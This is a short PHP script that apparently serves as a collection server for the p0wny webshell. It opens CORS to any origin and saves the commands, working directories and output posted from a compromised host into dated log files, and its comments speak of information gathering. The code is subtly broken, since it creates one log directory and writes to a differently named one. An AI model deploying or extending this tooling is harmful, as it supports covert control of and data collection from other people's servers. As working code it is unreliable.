<?php

header('Access-Control-Allow-Origin: *');//make answer accessible by the server running the webshell
header('Access-Control-Allow-Methods: GET, POST');
header("Access-Control-Allow-Headers: X-Requested-With");


function featureLog($out, $cwd, $cmd) {
    $date = date('Y').'-'.date('m').'-'.date('d');
    $time=date('H').'-'.date('i').'-'.date('s'); //could collide with two request in one second, if this matters consider .'-'.date('v')
    mkdir('p0wny_log/');
    mkdir('p0wny_log/'.$date.'/');
    $fcmd = @fopen('pnySh_log/'.$date.'/'.$time.'_cmd', 'w');
    $fout = @fopen('pnySh_log/'.$date.'/'.$time.'_out', 'w');


    if ($fcmd === FALSE || $fout === FALSE) {//change this to write anyway to lose no data for information gathering
        return array(
            'stdout' => array('Could Not Log')
        );
    } else {
        fwrite($fcmd, $cwd.' '.$cmd);
        fclose($fcmd);

        fwrite($fout, $out);
        fclose($fout);
        return array(
            'stdout' => array('Logged')
        );
    }
}


if (isset($_GET["feature"])) {

    $response = NULL;

    switch ($_GET["feature"]) {//add more features maybe in addition with the download or upload function
        case 'log':
            $response = featureLog($_POST['out'], $_POST['cwd'], $_POST['cmd']);
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
}
?>
